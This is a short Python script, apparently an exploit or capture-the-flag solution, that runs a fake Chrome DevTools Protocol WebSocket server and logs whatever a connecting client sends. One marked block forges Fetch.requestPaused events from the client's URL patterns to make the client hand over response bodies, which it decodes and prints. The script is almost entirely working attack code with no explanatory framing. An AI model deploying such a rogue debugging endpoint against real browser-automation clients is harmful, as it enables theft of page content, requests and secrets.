import aiohttp.web
import json
import base64

request_paused_template = {"method":"Fetch.requestPaused","params":{"requestId":"interception-job-4.0","request":{"url":'',"method":"GET","headers":{}}}}

async def websocket_handler(request):
    ws = aiohttp.web.WebSocketResponse()
    await ws.prepare(request)

    print('Opened', flush=True)
    async for msg in ws:
        if msg.type == aiohttp.WSMsgType.TEXT:
            print(msg.data, flush=True)

            # code below is unrelated to the task solution, just to show what else can be leaked
            try:
                data = json.loads(msg.data)
                if data['method'] == 'Fetch.enable':
                    for pattern in data['params']['patterns']:
                        request_paused_template['params']['request']['url'] = pattern["urlPattern"].replace('http?', 'https')
                        await ws.send_json(request_paused_template)
                elif data['method'] == 'Fetch.fulfillRequest':
                    print(base64.b64decode(data['params']['body'].encode()).decode())
            except:
                ...
            # unrelated code end

    return ws


async def make_app():
    app = aiohttp.web.Application()
    app.router.add_route('GET', '/', websocket_handler)
    return app


def main():
    aiohttp.web.run_app(make_app(), host='127.0.0.1', port=12228)


if __name__ == '__main__':
    main()